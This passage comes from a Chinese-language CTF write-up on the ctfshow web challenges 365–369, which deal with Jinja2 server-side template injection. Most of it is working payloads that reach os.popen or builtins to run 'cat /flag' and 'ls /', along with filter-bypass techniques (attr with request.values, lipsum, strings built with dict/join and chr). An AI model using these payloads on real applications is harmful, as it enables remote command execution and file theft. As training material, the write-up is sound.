+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getitem()</span><br><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.b)(request.values.a).read()&#125;&#125;&amp;b=popen&amp;a=cat /flag</span><br><span class="line">pop()</span><br><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().pop(132).__init__.__globals__.pop(request.values.b)(request.values.a).read()&#125;&#125;&amp;b=popen&amp;a=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><h2 id="增加过滤下划线"><a href="#增加过滤下划线" class="headerlink" title="#增加过滤下划线"></a>#增加过滤下划线</h2><p>在获取基类的时候发现有过滤，但是不知道是class还是下划线</p>
+<p>绕过下划线的时候用request没成功，猜测应该是同时也过滤了中括号，那就试一下另一个方法</p>
+<h2 id="attr-request-values-参数-绕过"><a href="#attr-request-values-参数-绕过" class="headerlink" title="attr(request.values.参数)绕过"></a>attr(request.values.参数)绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原payload</span><br><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">绕过payload</span><br><span class="line">&#123;&#123;()|attr(request.values.a)&#125;&#125;&amp;a=__class__</span><br><span class="line">().__class__ 与 ()|attr(“__class__”)是一样的效果，由于下划线被过滤，我们通过传参的方式来解决，即：()|attr(request.values.a)&amp;a=__class__。</span><br></pre></td></tr></table></figure>
+
+<p>所以我们的payload就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.h)(request.values.i)).read()&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;h=popen&amp;i=ls /</span><br></pre></td></tr></table></figure>
+
+<p>但是这里可以看到在外头需要加括号，括号的使用是为了明确地控制调用顺序和执行上下文，尤其是在多个属性和方法调用的情况下。</p>
+<p>如果不用加括号的话，我们需要把我们的read()函数也换成前面的形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.h)(request.values.i)|attr(request.values.j)()&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;h=popen&amp;i=ls&amp;j=read</span><br></pre></td></tr></table></figure>
+
+<h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><h2 id="增加过滤os"><a href="#增加过滤os" class="headerlink" title="#增加过滤os"></a>#增加过滤os</h2><p>用366的payload能打通，后面才知道过滤了os，但是不影响我们的payload</p>
+<h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><h2 id="增加过滤花括号"><a href="#增加过滤花括号" class="headerlink" title="#增加过滤花括号"></a>#增加过滤花括号</h2><p>一开始以为是过滤了括号，后面找bypass也没找到什么，后面看wp才发现是过滤了<code>&#123;&#123;&#125;&#125;</code>花括号，那我们试着绕过一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用&#123;%%&#125;print去进行绕过</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%print((()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.g)(request.values.h)).read())%&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=popen&amp;h=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>使用小括号()获取基类在获取子类找到可以执行os命令的子类再去执行命令也是可以的，不过这种方法比较繁琐，我们使用lipsum获取比较快捷一点。</p>
+<h3 id="通过lipsum获取os模块"><a href="#通过lipsum获取os模块" class="headerlink" title="通过lipsum获取os模块"></a>通过lipsum获取os模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%print (lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h1><h2 id="增加过滤request"><a href="#增加过滤request" class="headerlink" title="#增加过滤request"></a>#增加过滤request</h2><p>测试发现过滤了request，前面的方法都打不通了，看wp学到了构造字符的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125; </span><br></pre></td></tr></table></figure>
+
+<p>先来解释一下这个代码，也是我们构造字符的开始</p>
+<ol>
+<li>**<code>&#123;% set ... %&#125;</code>**：这是 Jinja2 中的语法，用于定义一个变量。这里我们正在创建一个变量 <code>po</code>。</li>
+<li>**<code>dict(po=a,p=a)</code>**：这部分代码创建了一个字典。字典中的键是 <code>po</code> 和 <code>p</code>，它们的值都是变量 <code>a</code></li>
+<li>**<code>|join</code>**：<code>join</code> 是一个 Jinja2 过滤器。它用于将可迭代对象（如列表或字典的值）连接成一个字符串，通常使用指定的分隔符（如果没有提供，默认是空字符串）。在这个例子中，<code>join</code> 会尝试将字典的键或值连接成一个字符串。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% set po=dict(po=a, p=a) | join %&#125;&#123;%print(po)%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>页面回显pop，可以看出我们成功构造了pop</p>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;          //拼接出pop</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;         //拼接出_</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join%&#125;          //拼接出__init__</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;       //拼接出__globals__</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;		//拼接出__getitem__</span><br><span class="line">&#123;% <span class="built_in">set</span> buil=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;		//拼接出__builtins__</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;		</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;		//使用<span class="built_in">chr</span>类来进行RCE因为等会要<span class="built_in">ascii</span>转字符</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;	//拼接出/flag</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web361"><span class="toc-number">1.</span> <span class="toc-text">web361</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#jinja2%E7%9A%84ssti"><span class="toc-number">1.1.</span> <span class="toc-text">#jinja2的ssti</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web362"><span class="toc-number">2.</span> <span class="toc-text">web362</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%83%A8%E5%88%86%E6%95%B0%E5%AD%97"><span class="toc-number">2.1.</span> <span class="toc-text">#过滤部分数字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">绕过数字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E7%AE%97%E5%BC%8F"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.用加减乘除算式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8subprocess-Popen"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.利用subprocess.Popen()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web363"><span class="toc-number">3.</span> <span class="toc-text">web363</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-number">3.1.</span> <span class="toc-text">#过滤单双引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">绕过单双引号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#request-%E6%97%81%E8%B7%AF%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">request 旁路注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web364"><span class="toc-number">4.</span> <span class="toc-text">web364</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4args"><span class="toc-number">4.1.</span> <span class="toc-text">#增加过滤args</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8chr%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6"><span class="toc-number">4.2.</span> <span class="toc-text">用chr拼接字符</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web365"><span class="toc-number">5.</span> <span class="toc-text">web365</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">5.1.</span> <span class="toc-text">#增加过滤中括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-getitem-%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.</span> <span class="toc-text">使用_getitem_()绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-pop-%E7%BB%95%E8%BF%87"><span class="toc-number">5.3.</span> <span class="toc-text">使用.pop()绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web366"><span class="toc-number">6.</span> <span class="toc-text">web366</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">6.1.</span> <span class="toc-text">#增加过滤下划线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#attr-request-values-%E5%8F%82%E6%95%B0-%E7%BB%95%E8%BF%87"><span class="toc-number">6.2.</span> <span class="toc-text">attr(request.values.参数)绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web367"><span class="toc-number">7.</span> <span class="toc-text">web367</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4os"><span class="toc-number">7.1.</span> <span class="toc-text">#增加过滤os</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web368"><span class="toc-number">8.</span> <span class="toc-text">web368</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="toc-number">8.1.</span> <span class="toc-text">#增加过滤花括号</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87lipsum%E8%8E%B7%E5%8F%96os%E6%A8%A1%E5%9D%97"><span class="toc-number">8.1.1.</span> <span class="toc-text">通过lipsum获取os模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web369"><span class="toc-number">9.</span> <span class="toc-text">web369</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4request"><span class="toc-number">9.1.</span> <span class="toc-text">#增加过滤request</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&text=web入门SSTI篇--ctfshow"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&title=web入门SSTI篇--ctfshow"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&is_video=false&description=web入门SSTI篇--ctfshow"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web入门SSTI篇--ctfshow&body=Check out this article: https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&title=web入门SSTI篇--ctfshow"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&title=web入门SSTI篇--ctfshow"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&title=web入门SSTI篇--ctfshow"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&title=web入门SSTI篇--ctfshow"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&name=web入门SSTI篇--ctfshow&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/&t=web入门SSTI篇--ctfshow"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
